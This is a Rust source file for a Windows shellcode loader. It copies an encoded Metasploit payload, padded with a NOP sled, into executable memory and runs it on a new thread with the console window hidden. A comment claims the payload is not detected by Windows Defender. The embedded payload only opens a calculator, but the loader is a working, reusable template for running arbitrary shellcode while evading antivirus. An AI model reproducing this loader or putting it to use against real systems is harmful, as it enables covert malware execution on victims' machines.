#![windows_subsystem = "windows"]

/*
Note: to statically link vcruntime, add the following to ~/.cargo/config
[target.x86_64-pc-windows-msvc]
rustflags = ["-C", "target-feature=+crt-static"]

*/

use std::{mem::transmute, ptr, ffi::CString};

#[link(name="kernel32")]
extern {
	pub fn LoadLibraryA(lpLibFileName: *const i8) -> *const i8;
	pub fn GetProcAddress(hModule: *const i8, lpProcName: *const i8) -> *const i8;
	pub fn VirtualAlloc(lpAddress: *const u8, dwSize: usize, flAllocationType: i32, flProtect: i32) -> *const u8;
	pub fn CreateThread(lpThreadAttributes: *const i8, dwStackSize: usize, lpStartAddress: *const u8, 
		lpParameter: *const u8, dwCreationFlags: usize, lpThreadId: *const u8) -> *const u8;
	pub fn  WaitForSingleObject(hHandle: *const u8, dwMilliseconds: isize) -> usize;
}

fn main() {
	load_shellcode();
}

fn load_shellcode(){
	/*
	 * windows/x64/exec - 327 bytes
	 * https://metasploit.com/
	 * Encoder: x64/zutto_dekiru
	 * VERBOSE=false, PrependMigrate=false, EXITFUNC=thread, 
	 * CMD=calc.exe
	 */
	 // Not detected by Windows Defender
    let payload: [u8; 455] = [
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x48,0x89,0xe1,0x48,0xbf,0x29,0x7f,0x3e,0xff,0xcd,0xcb,0x3d,0x86,0xda,0xd8,
		0x66,0x81,0xe1,0x70,0xf3,0x48,0x0f,0xae,0x01,0x4d,0x31,0xd2,0x41,0xb2,0x23,
		0x48,0x8b,0x71,0x08,0x49,0xff,0xca,0x4a,0x31,0x7c,0xd6,0x22,0x4d,0x85,0xd2,
		0x75,0xf3,0xd5,0x37,0xbd,0x1b,0x3d,0x23,0xfd,0x86,0x29,0x7f,0x7f,0xae,0x8c,
		0x9b,0x6f,0xd7,0x7f,0x37,0x0f,0x2d,0xa8,0x83,0xb6,0xd4,0x49,0x37,0xb5,0xad,
		0xd5,0x83,0xb6,0xd4,0x09,0x37,0xb5,0x8d,0x9d,0x83,0x32,0x31,0x63,0x35,0x73,
		0xce,0x04,0x83,0x0c,0x46,0x85,0x43,0x5f,0x83,0xcf,0xe7,0x1d,0xc7,0xe8,0xb6,
		0x33,0xbe,0xcc,0x0a,0xdf,0x6b,0x7b,0x3e,0x6f,0xb7,0x46,0x99,0x1d,0x0d,0x6b,
		0x43,0x76,0xfe,0x1d,0x40,0xbd,0x0e,0x29,0x7f,0x3e,0xb7,0x48,0x0b,0x49,0xe1,
		0x61,0x7e,0xee,0xaf,0x46,0x83,0x25,0xc2,0xa2,0x3f,0x1e,0xb6,0xcc,0x1b,0xde,
		0xd0,0x61,0x80,0xf7,0xbe,0x46,0xff,0xb5,0xce,0x28,0xa9,0x73,0xce,0x04,0x83,
		0x0c,0x46,0x85,0x3e,0xff,0x36,0xc0,0x8a,0x3c,0x47,0x11,0x9f,0x4b,0x0e,0x81,
		0xc8,0x71,0xa2,0x21,0x3a,0x07,0x2e,0xb8,0x13,0x65,0xc2,0xa2,0x3f,0x1a,0xb6,
		0xcc,0x1b,0x5b,0xc7,0xa2,0x73,0x76,0xbb,0x46,0x8b,0x21,0xcf,0x28,0xaf,0x7f,
		0x74,0xc9,0x43,0x75,0x87,0xf9,0x3e,0x66,0xbe,0x95,0x95,0x64,0xdc,0x68,0x27,
		0x7f,0xa6,0x8c,0x91,0x75,0x05,0xc5,0x5f,0x7f,0xad,0x32,0x2b,0x65,0xc7,0x70,
		0x25,0x76,0x74,0xdf,0x22,0x6a,0x79,0xd6,0x80,0x63,0xb7,0x77,0xca,0x3d,0x86,
		0x29,0x7f,0x3e,0xff,0xcd,0x83,0xb0,0x0b,0x28,0x7e,0x3e,0xff,0x8c,0x71,0x0c,
		0x0d,0x46,0xf8,0xc1,0x2a,0x76,0x2b,0x20,0xac,0x23,0x3e,0x84,0x59,0x58,0x76,
		0xa0,0x79,0xfc,0x37,0xbd,0x3b,0xe5,0xf7,0x3b,0xfa,0x23,0xff,0xc5,0x1f,0xb8,
		0xce,0x86,0xc1,0x3a,0x0d,0x51,0x95,0xcd,0x92,0x7c,0x0f,0xf3,0x80,0xeb,0x9c,
		0xac,0xa7,0x5e,0xa8,0x4c,0x07,0x5b,0xff,0x7a,0x8a,0x0a,0x7f 
	];

    unsafe { 
      let buffer = VirtualAlloc(ptr::null(), 1000, 0x3000, 0x40) as *mut u8; 
      println!("address: {:?}", buffer);
      ptr::copy_nonoverlapping(payload.as_ptr(), buffer, 455);
      let t = CreateThread(ptr::null(), 0, buffer, ptr::null(), 0, ptr::null());
      WaitForSingleObject(t, -1);
    }
}
